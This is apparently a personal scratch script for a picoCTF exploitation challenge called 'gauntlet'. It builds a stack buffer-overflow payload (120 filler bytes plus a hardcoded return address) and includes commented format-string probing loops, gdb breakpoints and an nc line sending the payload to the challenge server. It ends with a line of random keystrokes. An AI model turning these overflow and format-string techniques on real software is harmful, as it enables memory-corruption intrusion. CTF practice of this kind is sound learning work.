import os
import pyperclip
# for i in range(5):
#     # i=3
#     payload = "%"+str(i)+"\$s \x30\xeb\xff\xff\xff\x7f"

#     # payload = "%3\$x \x30\xeb\xff\xff\xff\x7f"
#     # payload = "%x"*20 + "BBAACCDD"
#     # print(payload)
#     # os.system('echo ' + payload)
#     payload = "A"*500
#     os.system('echo ' + payload +' | ./gauntlet')
#     os.system('echo ""')
# 118-120

# break *0x0000000000400727
# break *0x00000000004006bc
                #    0x7fffffffdb10
# payload = "A"*120 + "BBBBBB"
payload = "A"*120 + "\x10\xdb\xff\xff\xff\x7f"
pyperclip.copy(payload)
# os.system('./gauntlet')
print(payload)
# print("break *0x000000000040074e")
# print("r")
# print(payload)
# os.system('echo ' + payload +' | nc mercury.picoctf.net 11022')
# 7fffffffeb30
# 41414141414242
# \x30\xeb\xff\xff\xff\x7f
# for ((i = 1; i < 200; i++)); do ./gauntlet; echo "BBAAAACC%$i\$x"; done | grep 4141

# for ((i = 1; i < 200; i++)); do echo -n "$i " && ./gauntlet && echo "" && echo "BBAAAACC%$i\$x"; done | grep 4141
# XYZDCBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

asdlkfjsldkjflskdjflksjdlfkkjbafdkjghdsiluhgoihfiunlmdfndgohdikjrnelkfhjuiobfgsdjfoihsbfoqeifjio8wejflksdfjoishejwenofin

